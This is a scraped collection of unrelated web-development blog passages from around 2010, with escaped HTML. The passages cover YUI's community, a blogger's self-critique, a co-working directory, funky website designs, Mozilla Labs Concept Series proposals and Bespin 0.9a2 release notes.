doesn’t mean that an inferior product is being created. There’s a reason that Firefox is the #2 browser, and that’s because of dedicated individuals who are passionate about their work and who want to create the best possible product. When the product is your full time job, it’s much easier to do. Believing that a community can’t form around an open source library that’s funded by a large company is silly; communities are formed through outreach, communication, and collaboration, not by non-profit status.</p>\n<p>The YUI team worked very hard to develop a third-party contribution model. Yes, it’s had some growing pains, but the results have been fantastic thusfar. Certainly, YUI hasn’t had anywhere near the number of outside contributions as jQuery, but YUI is trying. Matt Snider, formerly of Mint.com, <a href=\"http://www.yuiblog.com/blog/2009/11/05/video-snider-yuiconf2009/\">has a full-fledged component shipping as part of YUI 2</a>, a component on which he gave a talk at last year’s YUIConf. To me, that’s a great thing. It’s a sign to others that if you’re willing to approach the YUI team with an idea, you absolutely can get support and get your component into the library. Matt put a lot of work into that component, and hopefully YUI can find more people like him who are willing to take the time to collaborate and make meaningful contributions to the library. Also, the <a href=\"http://yuilibrary.com/gallery/\">YUI Gallery</a> is quite possibly the most awesomest thing I’ve seen: a way for everyone to easily publish their YUI additions into a listing <em>and</em> have those made available on Yahoo!’s content delivery network. Right now there are 227 gallery modules, all benefiting from Yahoo!’s edge.</p>\n<p>Can the YUI team improve it’s community outreach and contribution model? Absolutely. Does YUI have to split from Yahoo! to do that? No. YUI 3 is a great product, supported by great people and a growing community. If the team can be accused of anything, it’s ignoring marketing and public relations in favor of developing new features. That’s an area in which jQuery excels, and there’s a lot that the team can learn.</p>\n<p>YUI is not jQuery, and I think trying to be like jQuery would be a mistake. Does that mean YUI can’t learn from jQuery? Absolutely not. The jQuery community is absolutely amazing and there isn’t an open source project in the world that wouldn’t love to have the same type of community. YUI doesn’t have to become jQuery for that to happen, nor does it have to cut ties with Yahoo! to that end. jQuery is but one example of how to build a community, and as I’m rather famous for saying to my colleagues, there’s always more than one solution to a problem – it’s choosing the right solution that’s the real challenge. I believe that following jQuery step-by-step would be a mistake for YUI because the two libraries have different origins, different strengths, and different target audiences. YUI needs to find its own way, one that embraces the company from which its insights and experience are gathered. And I believe YUI can do this.<br>\n<h2>Related posts</h2>\n<ul>\n<li><a href=\"http://www.nczonline.net/blog/2008/11/12/front-page-and-yui-3-causes-a-stir/\" title=\"Front Page and YUI 3 causes a stir\">Front Page and YUI 3 causes a stir</a></li>\n<li><a href=\"http://www.nczonline.net/blog/2006/02/13/yahoo-user-interface-blog/\" title=\"Yahoo!

 IE’s just implementing those too.  In working with the MooTools and Dojo teams over the past years, I’ve realized how useful these edge APIs are.  Most of the time you can simply use JavaScript to create shims for browsers that don’t implement specific APIs.</p><p>This has clearly been my largest point of ignorance.   I’m sorry web development pioneers — I wont be this dumb again.</p><h2>“It’s MooTools or Nothing At All”</h2><p>I’m the biggest MooTools fanboy you’ll find.  I could go on for hours about how FTW MooTools is.  Shockingly awesome API.  Rock solid stable.  Modular.  Compact.  If MooTools were a chick, I’d have married her years ago.  Unfortunately, however, MooTools isn’t the best fit for everything.  Having worked with Dojo on a daily basis for six months now, I realize that Dojo’s probably the best solution for UI-driven web applications because of the elegant themes and number of consistent widgets available.  Dojo also has outstanding charting and vector graphic libraries available.  So while MooTools is synonymous for “FTW,” it’s not always the best solution for every project.</p><h2>“Macs are for Smug Hippies”</h2><p>My impression of Mac users was always that they were arrogant, self-righteous, tree-hugging, Zima-drinking, bicycle-riding, vegan, no-deoderant-wearing hippies.  It wasn’t until last summer that I got my first Mac and within a hour of using it, I realized how wrong I was.  The UI that I once labeled as “animating for smug designers”  was refreshing.  No need to install Cygwin to get a useful command line.  Apache and SVN out of the box.  Quality, no nonsense software.  Easy install processes.   Frequent software updates.  TextMate.  I was wrong, my MacBook Pro.  I love you.</p><h2>“I Wont Join Twitter”</h2><p>I was once the typical moron that thought Twitter was about posting useless crap like “Sitting on the patio.”  ”Eating a carrot.”  ”Christina Ricci FTW.”  But since <a href=\"http://davidwalsh.name/twitter\">joining Twitter</a>, I’ve realized that it’s actually unbelievably useful.  It’s a great way to network, drive more traffic to deserving blog posts, and a great way to keep up with what’s going on in web development.  It’s also a great place to talk smack to my fellow web gurus.  Well played Twitter.  Well played.</p><h2>“UL Navigation is Overrated”</h2><p>At one point I thought I was super clever about using only anchor elements with fixed width and heights, a display property of “block,” and a touch of floating.  Obviously I wasn’t giving any thought to screen readers and users with visual impairments.  My bad.  I’m a grownup now.</p><h2>“Dudes Don’t Let Dudes Use Emoticons”</h2><p>I was never an emoticon guy until I started working from home.  It wasn’t until then that I realized that emoticons can be incredibly useful in laying down an attitude about something you IM to a coworker, especially when you have a dry sense of humor…or you’re IMing the person that signs your paycheck.</p><h2>Your Turn</h2><p>OK, so I’ve been wrong about a few things.  I’m close to perfect not quite there yet.  Since I’ve had the fortitude to come clean, it’s time for you to do so as well.  Share something you’ve been wrong about in the comments below and you will be absolved of all your web development sins.</p><p><strong>Follow Me!</strong> <a href=\"http://twitter.com/davidwalshblog\">Twitter</a> | <a href=\"http://www.facebook.com/#!/pages/David-Walsh-Blog/186644584869\">Facebook</a> | <a href=\"http://www.linkedin.com/in/davidjameswalsh\">LinkedIn</a> | <a href=\"http://mootools.net/forge/profile/davidwalsh\">MooTools Forge.</a><br><br>Full David Walsh Blog Post: <a href=\"http://davidwalsh.name/smack-talk\">Smack Talk:  Calling Myself Out</a></p><p>Related posts:<ol><li><a href=\"http://davidwalsh.name/calling-questions-mailbag\" rel=\"bookmark\" title=\"Permanent Link: Calling For Questions – Mailbag!\">Calling For Questions – Mailbag!</a></li><li><a href=\"http://davidwalsh.name/ideas-dwprogressbar-typewriter\" rel=\"bookmark\" title=\"Permanent Link: Calling For Ideas:  dwProgressBar and Typewriter\">Calling For Ideas:  dwProgressBar and Typewriter</a></li><li><a href=\"http://davidwalsh.name/twitter\" rel=\"bookmark\" title=\"Permanent Link: I’ve Finally Caved: Twitter\">I’ve Finally Caved: Twitter</a></li><li><a href=\"http://davidwalsh.name/david-walsh-twitter\" rel=\"bookmark\" title=\"Permanent Link: David Walsh on Twitter\">David Walsh on Twitter</a></li><li><a href=\"http://davidwalsh.name/dijits-filteringselect\" rel=\"bookmark\" title=\"Permanent Link: Make Dijit’s FilteringSelect Widget Display an Empty Option Value Label\">Make Dijit’s FilteringSelect Widget Display an Empty Option Value Label</a></li></ol></p><img src=\"http://feeds.feedburner.com/~r/Bludice/~4/zG59yfN7HQM\" height=\"1\" width=\"1\"></p>"

While many freelancers get out of their day jobs so they can work from home, just as many of us aren’t capable of getting any work done unless we’re out of the house. Those Seinfeld re-runs can be awfully tempting.</p>\n<p>DesksNear.Me will try to discern your location and help you quickly find a location, or you can use the search function if your location can’t be determined, or you’re planning a workspace for a working holiday. Once you select a place from a map, you’ll see a page with availability and other relevant information. For instance, here’s the page for the <a href=\"http://desksnear.me/workplaces/62-the-openhub\">OpenHub</a>, a place a much younger Envato called its office for some time.</p>\n<p>If you run a co-working space, you can add it to the DesksNear.Me directory for free–just fill out a few questions about your location, number of desks, booking preferences and provide a general description. For now it’s free to list all types of co-working space but in the future those who charge for a desk may need to pay a listing fee.</p>\n<p>DesksNear.Me was developed for the <a href=\"http://railsrumble.com/\">Rails Rumble</a> and came in at 6th place.

Whether it’s the layout, color scheme, graphics, or some combination of the three, these sites are pushing beyond the standards of web design conventions.<span></span></p><h1><strong>Consumer</strong></h1><p><a href=\"http://www.weareconsumer.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/consumer.jpg\" alt=\"consumer\" width=\"615\" height=\"475\"></a></p><p>The Consumer site uses an animated header that transitions through a number of colors, including blue, green, and pink, and the site includes some screaming cartoon rabbits. It’s definitely non-traditional.</p><p><br></p><h1><strong>Contrast</strong></h1><p><a href=\"http://www.contrast.ie/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/contrast.jpg\" alt=\"contrast\" width=\"615\" height=\"475\"></a></p><p>The mix of grunge and collage elements, combined with ‘hand-written’ testimonials in the header makes for a very interesting first glimpse at the Contrast website. The layout only continues its unconventionalism from there, with more testimonials further down the page, as well as links to some of their work.</p><p><br></p><h1><strong>Jim Carrey</strong></h1><p><a href=\"http://www.jimcarrey.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/jimcarrey.jpg\" alt=\"jimcarrey\" width=\"615\" height=\"333\"></a></p><p>Jim Carrey’s website is one of the most interesting Flash-based sites that I’ve come across. Every part of the page is animated, including the “bird” with Carrey’s head spitting out his most recent tweets. There are also links throughout the page, with animations between pages. But the artwork and overall design are what really pushes this design to the limits and makes it so much fun to browse.</p><p><br></p><h1><strong>Filcka</strong></h1><p><a href=\"http://filcka.cz/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/filcka.jpg\" alt=\"filcka\" width=\"615\" height=\"475\"></a><br> The more organic design of this page is unconventional but still very user-friendly. The pictures on the wall work great as links to view social media profiles or contact the site, while the grunge elements bring everything together.</p><p><br></p><h1><strong>F91W</strong></h1><p><a href=\"http://f91w.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/f91w.jpg\" alt=\"f91w\" width=\"615\" height=\"450\"></a></p><p>It’s not just the design of this site that’s a bit funky, but also the concept. Reporting activity every hour and consciously deciding what to do with the next hour is an interesting idea for a website and goes a bit beyond regular lifecasting. The color scheme and narrow layout push the design to the next level.</p><p><br></p><h1><strong>Living Lyric</strong></h1><p><a href=\"http://www.supportthelyric.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/livinglyric.jpg\" alt=\"livinglyric\" width=\"615\" height=\"475\"></a></p><p>The skewed header and grass-green background color of the Living Lyric website lends a bit of funkiness to the overall design. It’s a simple site, with bold graphics and a clear purpose.</p><p><br></p><h1><strong>Transformer Studio</strong></h1><p><a href=\"http://www.transformerstudio.ru/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/transformerstudio.jpg\" alt=\"transformerstudio\" width=\"615\" height=\"333\"></a></p><p>The subtle animations on the home page of the Transformer Studio site make it unconventional. And whenever one of the links on the home page is clicked, the background color expands to the whole page where the new content is displayed. It’s another great example of a very user-friendly page that does something different than the norm.</p><p><br></p><h1><strong>Grip Limited</strong></h1><p><a href=\"http://www.griplimited.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/griplimited.jpg\" alt=\"griplimited\" width=\"615\" height=\"335\"></a></p><p>Grip Limited’s website is visually striking, with oversized, diverse typography and bright orange accents. Its functionality is also different, with each column scrolling individually (via a number of methods, see column 2 for details).</p><p><br></p><h1><strong>Random Thought Pattern</strong></h1><p><a href=\"http://www.randomthoughtpattern.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/randomthoughtpattern.jpg\" alt=\"randomthoughtpattern\" width=\"615\" height=\"400\"></a></p><p>Between the chartreuse and gray color scheme and the typography that doesn’t quite sit on the page, the RandomThoughtPattern website fits the definition of funky perfectly. It’s also a very usable site and the unconventional layout doesn’t detract from that.</p><p><br></p><h1><strong>Sold-Out</strong></h1><p><a href=\"http://www.sold-out.ch/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/soldout.jpg\" alt=\"soldout\" width=\"615\" height=\"475\"></a></p><p>The sold-out site is a collection of links, each of which shows a tooltip when hovered over that gives a bit of information about the link. It’s an unconventional design that’s usable in this context, but could get confusing fast.</p><p><br></p><h1><strong>Wolf &amp; Badger</strong></h1><p><a href=\"http://www.wolfandbadger.com/flash.html\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/wolfandbadger.jpg\" alt=\"wolfandbadger\" width=\"615\" height=\"411\"></a></p><p>Here’s another Flash site that has some incredibly interesting visuals. It’s unconventional design at its best, fun to look at as well as to use.</p><p><br></p><h1><strong>Creative with a K</strong></h1><p><a href=\"http://www.creativewithak.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/creativewithak.jpg\" alt=\"creativewithak\" width=\"615\" height=\"333\"></a></p><p>The animated, illustrated background here is funky and interesting, as well as tons of fun to use. Just close the initial modal window and parts of the illustration will become colorized when you hover. Click on any of those and another modal window is opened. It’s a unique take on interface design and works incredibly well here.</p><p><br></p><h1><strong>Blue Bug Digital</strong></h1><p><a href=\"http://www.bluebugdigital.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/bluebugdigital.jpg\" alt=\"bluebugdigital\" width=\"615\" height=\"333\"></a></p><p>Here’s another site that uses not only a funky color scheme, but also an unconventional layout and navigation (which you can rearrange depending on your own preferences). The background responds to your mouse movements, and each link displays new content in something like a full-page modal window. There’s also a pull-out menu you can use so you don’t have to go back to the home page before visiting a new page.</p><p><br></p><h1><strong>Ozan Akoglu</strong></h1><p><a href=\"http://www.ozanakoglu.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/ozanakoglu.jpg\" alt=\"ozanakoglu\" width=\"615\" height=\"402\"></a></p><p>This is a fairly simple layout, but the background image (which looks like paper cutouts) and bright yellow header make it funky. The navigation is what really sets it apart though. Through a combination of mouse movements and keyboard entries, you can view projects and the information about those projects. Instructions are included for each step, but are integrated perfectly into the site’s design.</p><p><br></p><h1><strong>Monster CSS</strong></h1><p><a href=\"http://www.monstercss.com/en/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/monstercss.jpg\" alt=\"monstercss\" width=\"615\" height=\"356\"></a></p><p>The animated monster in the background (he walks back and forth across the screen and occasionally makes some noise) sets the Monster CSS site apart from other sites. It’s  a simple design otherwise.</p><p><br></p><h1><strong>Ryan O’Rourke</strong></h1><p><a href=\"http://www.ryan-orourke.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/ryanorourke.jpg\" alt=\"ryanorourke\" width=\"615\" height=\"405\"></a></p><p>The animated brain sets this site apart. It also uses a stationary left column while the right column is scrollable.</p><p><br></p><h1><strong>The Digital Invaders</strong></h1><p><a href=\"http://thedigitalinvaders.com/#/home\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/digitalinvaders.jpg\" alt=\"digitalinvaders\" width=\"615\" height=\"368\"></a></p><p>The illustration here has a constant animation. You can click anywhere and move the page around, or use the menu at the bottom. It’s a fun user experience.</p><p><br></p><h1><strong>Natrashka</strong></h1><p><a href=\"http://www.natrashka.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/natrashka.jpg\" alt=\"natrashka\" width=\"615\" height=\"475\"></a></p><p>The graphics here are definitely what make this site great. The layout is simple, but the typography is a bit unconventional and the header image is definitely funky.</p><p><br></p><h1><strong>Toykyo</strong></h1><p><a href=\"http://toykyo.be/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/toykyo.jpg\" alt=\"toykyo\" width=\"615\" height=\"373\"></a></p><p>This is a relatively simple site design, but the bright blue, red, and brown color scheme set it apart and make it funkier than most sites, especially minimalist ones.</p><p><br></p><h1><strong>We Made That</strong></h1><p><a href=\"http://www.wemadethat.co.uk/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/wemadethat.jpg\" alt=\"wemadethat\" width=\"615\" height=\"411\"></a></p><p>The mostly-monochromatic design here is interesting, as is the background graphic (which appears to be a cross-section of a wall or roof). It’s a simple design that’s very aesthetically pleasing and interesting.</p><p><br></p><h1><strong>Paul Frank Art Attack Contest</strong></h1><p><a href=\"http://www.paulfrank.com/art_attack/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/artattack.jpg\" alt=\"artattack\" width=\"615\" height=\"475\"></a></p><p>The bright red and aqua color scheme are definitely what put this site squarely into the funky category. The layout is relatively traditional, with a basic grid and tabbed navigation on the side. Using old-school Courier New for some of the typography also helps the site stand out.</p><p><br></p><h1><strong>The FARM</strong></h1><p><a href=\"http://www.thefarmprojects.org/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/thefarm.jpg\" alt=\"thefarm\" width=\"615\" height=\"475\"></a></p><p>The layout here is pretty traditional, but using multiple colors in the typography at the top makes it great.</p><p><br></p><h1><strong>Wilkintie</strong></h1><p><a href=\"http://www.wilkintie.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/wilkintie.jpg\" alt=\"wilkintie\" width=\"615\" height=\"475\"></a></p><p>The design here is pretty traditional, too, but the bright yellow and brown color scheme is not something you see often online. It really sets the site apart, and when combined with lots of other little details (the torn paper effect on the bottom of the images, etc.) it really makes this site something special.</p><p><br></p><h1><strong>Emigre</strong></h1><p><a href=\"http://emigre.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/emigre.jpg\" alt=\"emigre\" width=\"615\" height=\"475\"></a></p><p>Color schemes based on primary colors aren’t seen very often, mostly because of the high probability they’ll clash. But here they’re used beautifully and really set the site apart. The grid layout also works well, and is a bit different than most of the grids we see.</p><p><br></p><h1><strong>MultiAdaptor</strong></h1><p><a href=\"http://multiadaptor.com/#/home/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/multiadaptor.jpg\" alt=\"multiadaptor\" width=\"615\" height=\"381\"></a></p><p>The big background here, which changes color slowly, along with the grid-based layout with different image sizes is visually interesting and user-friendly. When the images are clicked on, new content slides across the screen, blocking everything out except the main navigation.</p><p><br></p><h1><strong>Rudd Studio</strong></h1><p><a href=\"http://www.ruddstudio.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/ruddstudio.jpg\" alt=\"ruddstudio\" width=\"615\" height=\"443\"></a></p><p>Click on any of the colored squares here and all of them will convert to an animated portfolio view, with clickable projects. If a project is clicked on, it will replace the colored blocks and display information about that specific project, with multiple images for each one (the number of colored blocks in each section corresponds to the number of images for that project).</p><p><br></p><h1><strong>Herron School of Art and Design</strong></h1><p><a href=\"http://www.herron.iupui.edu/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/herronschool.jpg\" alt=\"herronschool\" width=\"615\" height=\"480\"></a></p><p>The concentric circles in the interface here offer up additional content links beyond what the main navigation provides. It’s a neat way to highlight specific content while doing something a bit different.</p><p><br></p><h1><strong>Kokoro &amp; Moi</strong></h1><p><a href=\"http://www.kokoromoi.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/kokoromoi.jpg\" alt=\"kokoromoi\" width=\"615\" height=\"475\"></a></p><p>The grid layout works well to organize a lot of content into a relatively small area. The dual-color blocks that contain text stand out, and the color corresponds to the content (news is orange, Twitter updates are pink, etc.). It’s a fantastic interface design that works well for displaying a lot of information.</p><p><br></p><h1><strong>Rachel Comey Men’s</strong></h1><p><a href=\"http://www.rachelcomeymens.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/rachelcomeymens.jpg\" alt=\"rachelcomeymens\" width=\"615\" height=\"373\"></a></p><p>The feet here animate when hovered over, and each one is also a product link. When clicked on, the page scrolls horizontally and vertically to display the product information, as well as links to share, find shipping information, view related products, and contact the company.</p><p><br></p><h1><strong>Story Hotel</strong></h1><p><a href=\"http://www.storyhotels.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/storyhotel.jpg\" alt=\"storyhotel\" width=\"615\" height=\"376\"></a><br> The organized collage layout here isn’t often seen, especially on a corporate website. Animations are used throughout the home page. The color scheme keeps everything tied together and professional-looking while still allowing for plenty of artistic freedom.</p><p><br></p><h1><strong>Woki Tokee</strong></h1><p><a href=\"http://www.wokitokee.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/wokitokee.jpg\" alt=\"wokitokee\" width=\"615\" height=\"373\"></a><br> The illustrated food here makes for a very interesting user interface. Links are easy to find and there are subtle animations on each page. It’s a fun site, that goes above and beyond considering there are only four pages total (including the home page).</p><p><br></p><p><em>Written exclusively for WDD by <a href=\"http://twitter.com/cameron_chapman\">Cameron Chapman</a>.</em></p><p><em><strong>Have you come across any other funky website designs or tutorials for creating funky designs?

Today though, we’d like to call on you to help us shape its future!</strong></p>\n<p>The Mozilla Labs <a href=\"http://mozillalabs.com/conceptseries/\">Concept Series</a>, with an <a href=\"https://mozillalabs.com/conceptseries/2009/07/30/introducing-the-concept-series-call-for-participation/\">open call for participation</a>,  has been around for a while now. We’ve seen awesome projects  emerge and had thousands join the community, share  ideas, develop  concepts and give feedback shaping the future of many Web explorations.</p>\n<p>The Seabird ‘<a href=\"http://mozphone.com/\">Open Web Concept Phone</a>’ alone, by community member <a href=\"http://www.billy-may.com/\">Billy  May</a>, has had more than 1,000 <a href=\"http://mozillalabs.com/conceptseries/2010/09/23/seabird/\">blog comments</a> and <a href=\"http://www.youtube.com/watch?v=oG3tLxEQEdg&amp;feature=watch_response\">2 million Youtube views</a> to date.</p>\n<p>Despite its initial success we feel it’s time to evolve the Concept  Series  into a larger scale program – take it to the next level and make it a  whole lot bigger and better!</p>\n<p>Aided by a team of global volunteers <em>[0]</em> working on the <a href=\"http://mozillalabs.com/conceptseries/2010/10/07/crowdsourcing-project-%E2%80%93-team-1-3-phase-2/\">Crowdsource</a> <a href=\"http://mozillalabs.com/conceptseries/2010/10/06/crowdsourcing-project-team-2-phase-2/\">Crowdsourcing</a> project, we’ve explored this  goal and had an initial go ourselves. Their hard-work and tremendous insights have largely aided the initial proposals below.</p>\n<p>Today we’d like to share our proposals and call on you for feedback to aid in shaping the future of the ‘new’ Concept Series.</p>\n<p><em>[0] Coleman Foley, Roei Yellin, João Menezes, Jan Dittrich, Ryan Bubinski, Ajay Roopakalu, Peter Organisciak, Euge Ortiz, Jimmy Chion, Abraham Taherivand, Piyush Kumar, Zach Williams, Chao Xu &amp; Ola Möller</em></p>\n<h2>Questions</h2>\n<p>To help outline our proposals we’ve attempted to answer 3 questions:</p>\n<ol>\n<li> What is the “new” Concept Series program?</li>\n<li>What are the aims of the Concept Series program?</li>\n<li>What defines the pieces which make up the Concept Series program?</li>\n</ol>\n<h3>1. What is the “new” Concept Series program?</h3>\n<p>The Mozilla Labs Concept Series lays the foundation for an engaging  innovation hub which will live on the Mozilla Labs website. It will be  fueled by a community with a common passion for the open Web.</p>\n<p>As a program the Concept Series will form the core foundation of  activity, consisting of multiple initiatives, referred to as channels.  These channels, like the ever popular Design Challenge, will provide  various challenges and topics by both Mozilla and collaborating  partners.</p>\n<p>Each channel will create  an environment of interaction within the  community (designers,  developers, students, teachers etc.) – really anyone  that uses the Web whether they have  just an idea, some thoughts, wise  feedback or some technical skills to  implement these on the Web.</p>\n<p>A quick overview of the proposed channels:</p>\n<ul>\n<li>{Mozilla Labs} Jam Days</li>\n<li>{Mozilla Labs} Student Outreach</li>\n<li>{Mozilla Labs} Community Concepts</li>\n<li>{Mozilla Labs} Design Challenge</li>\n<li>{Mozilla Labs} Open Web Library</li>\n<li>{Mozilla Labs} Prototype Challenge</li>\n<li>{Mozilla Labs} Local Frequency</li>\n</ul>\n<h3>2. What are the aims of the Concept Series program?</h3>\n<p>We  aim to create a hub of innovation channels, fueled by community   interaction and collaboration – ultimately leading to the creation of  varying artifacts (research, ideas, wire-frames, concepts, solutions,  prototypes etc.)</p>\n<p>We envisage these artifacts, under open licensing, will  lead to a formidable educational library, a resource that is freely  available and sharable for everyone.</p>\n<p>Each channel will engage community activity by:</p>\n<ul>\n<li>provoking thought</li>\n<li>sharing ideas</li>\n<li>facilitating discussion</li>\n<li>collectively innovating</li>\n</ul>\n<p>This community engagement will inspire the future vision of the Mozilla project, Firefox, and the open Web as a whole.</p>\n<h3>3. What defines the channels which make up the Concept Series program?</h3>\n<p>Each channel needs to aid in the aims of the overarching program to  create an innovation hub fueled by community interactive and  collaboration.</p>\n<p>The following are the initial channel proposals with a little more information…</p>\n<h4>3.1 {Mozilla Labs} Jam Days</h4>\n<p>A channel providing support and an initial framework for the organisation of physical un-conference like Jam Days.</p>\n<p>This encourages interaction between local community members tasked with investigating challenging topics for the Web.</p>\n<p>These events could include:</p>\n<ul>\n<li>Design Jams</li>\n<li>Hackdays</li>\n<li>BarCamps</li>\n</ul>\n<h4>3.2 {Mozilla Labs} Student Outreach</h4>\n<p>A channel to expose students thinking from co-created course modules between Mozilla and education institutions.</p>\n<p>We  aim to directly work together to propose and structure a engaging   course  module that’s relevant to the institutions own goals, interests   and timing schedules. Full support will be provided  during the  duration  of the course including community feedback, guest  lecturer  and mentor  appearances throughout the project.</p>\n<p>Potential student audience departments include:</p>\n<ul>\n<li>Human–computer interaction (HCI)</li>\n<li>Computer Science</li>\n<li>Robotics</li>\n<li>Engineering</li>\n<li>Social sciences</li>\n<li>Arts</li>\n</ul>\n<h4>3.3 {Mozilla Labs} Community Concepts</h4>\n<p>A channel aimed at molding proposed ideas and concepts from the  community into potentially viable features, applications or products.</p>\n<p>Once vetted for quality and viability by an expert panel, the concept  originator or team is given full control to lead the projects evolution by  engaging the community with updates of progress (mock-ups, prototypes,  videos, blog posts etc.)</p>\n<p>Providing this platform helps expose the concept to the community and  the feedback and other input given improves the chance of success.</p>\n<h4>3.4 {Mozilla Labs} Design Challenge</h4>\n<p>This channel exists today but we’re looking to revamp and enhance the  offerings. It will be aimed primarily at all design folk with a love and  passion for the entire user experience design process.</p>\n<p>Education, exposure, portfolio pieces and recognition are a major driver for this channel.</p>\n<p>Challenges and topics will be split into phases and exposed across a number of categories including:</p>\n<ul>\n<li>Web</li>\n<li>Mobile</li>\n<li>Social</li>\n<li>Hardware</li>\n</ul>\n<p>Feedback and mentor-ship from the community as well as industry  professionals will prove to be invaluable for students, junior designers  as well as anyone else keen on experiencing a design process.</p>\n<h4>3.5 {Mozilla Labs} Open Web Library</h4>\n<p>An educational channel resource for topics promoting the open Web.  Content will be delivered virtually by leading authorities via  video and audio.</p>\n<p>These resources could include:</p>\n<ul>\n<li>Training courses</li>\n<li>Q&amp;A sessions</li>\n<li>Workshop exercises</li>\n<li>Lightning talks</li>\n<li>Conferences</li>\n</ul>\n<p>An enhancement to this offering would be the translation and  subtitling of the original content into local language, thus making it  even more accessible to a global audience.</p>\n<h4>3.6 {Mozilla Labs} Prototype Challenge</h4>\n<p>This is a channel based very much on the mechanics of the Design  Challenge. It’s however more aimed at the developer engaged community.</p>\n<p>The major driver for this channel will be the posing of engaging and  difficult engineering problems. We’ll provide the questions and  let you  get back with the possible solutions.</p>\n<p>These challenges will be posed either virtually or as actual events and could take the format of:</p>\n<ul>\n<li>Quizzes</li>\n<li>Developing Design Challenge outputs</li>\n<li>Hackdays</li>\n<li>Demo nights</li>\n</ul>\n<h4>3.7 {Mozilla Labs} Local Frequency</h4>\n<p>A channel showcasing video and audio content from local tech events and meetups across the globe.</p>\n<p>Hundreds of these events take place daily, all containing valuable  educational content. It’s unfortunate though that if you weren’t able to  attend that this knowledge sharing is lost.</p>\n<p>We  propose enlisting trusted local events and empower the  coordinators to  create and upload video &amp; audio content and have it  exposed to a far wider reaching audience.</p>\n<p>Once again this offering could be enhanced by the translating and subtitling the original content into local language.</p>\n<h2>Closing Thoughts</h2>\n<p>Phewww, apologies! That was slightly longer than expected. We hope  that you are all as excited by these proposed channels as we are.</p>\n<p>Just remember that your feedback is highly valued and appreciated, so  go ahead and add your thoughts, comments, ideas, anything really!  We  promise to go through it all.</p>"

They aren’t web professionals, it’s not their fault for not knowing that this isn’t a good idea from a usability perspective.</p><p>If you’re going to convince them that this is a bad idea, however, then you’re going to need some rock solid material to back that up. While an element of trust is always important to a working relationship, you have to respect that sometimes clients will just need to see the facts in front of them to fully understand that what you’re saying is correct.</p><p>So, what we’ve done for you today is compiled a list of some of the biggest, most compelling usability articles which address common issues. Hopefully this should help you during tough conversations about what does and doesn’t work on a a website.</p><p>Bookmark this post, come back to it, use it in meetings and educate  your clients on the things which work for other websites, so that they might also work for them.</p><p><span></span></p><h1>How Not Forcing Users to Register Increased Sales by $300million</h1><p><a href=\"http://www.uie.com/articles/three_hund_million_button/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/2010/07/129.jpg\" alt=\"1\" width=\"615\" height=\"200\"></a></p><p>A truly fascinating article covering how one ecommerce site removed   forced user-registration during the checkout process, with a result of a   $300million increase in revenue.

In this post, I’ll also talk about what’s happening in the Skywriter transition.</i></p>\n<p>The most important change in Bespin 0.9a2 (<a href=\"http://ftp.mozilla.org/pub/mozilla.org/labs/bespin/Embedded/BespinEmbedded-0.9a2.tar.gz\">download it now</a>) is that it restores compatibility with Chrome. Chrome 6 included a change that broke a library used by Bespin.</p>\n<p>Bespin Embedded now has a jslint_command plugin which adds a (you guessed it!) <b>“jslint” command</b>. Running this command will run jslint on the code you’re editing and tell you if it spots any problems. If you make a build with the “notifier” and “gritter_notify”, you can even get a popup message when you run jslint and your file has<br>\nerrors.</p>\n<p>Also new is a <b>“specialmodules” setting</b>. If you’re editing CommonJS modules and the module name entered matches a regex contained in “specialmodules”, a special syntax highlighting tag (“specialmodule”) is added. This makes it possible to differentiate to your users which modules are provided by your system and which are their own.</p>\n<p>The Bookmarklet has been updated to include the <b>“diff” syntax highlighter</b>, which is useful if you are the type of person who reviews patches on the web.</p>\n<p>As announced a few weeks ago, the Bespin project is being renamed “Skywriter”. We are working on stabilizing APIs, simplifying some code and creating new JavaScript-based build tooling. The first release branded as Mozilla Skywriter will be a 1.0 alpha release, and as we head to a 1.0 final we’ll want to be sure that the APIs<br>\nwill be stable. In a few days, plenty of new opportunities to help out on the project<br>\nwill arise, so head over to the <a href=\"http://groups.google.com/group/skywriter-core/\">skywriter-core</a> mailing list if you’d like to help make Skywriter the best editor around.</p>\n<p><i>&amp;emdash; Kevin Dangoor on behalf of the Mozilla Developer Tools team</i></p>"

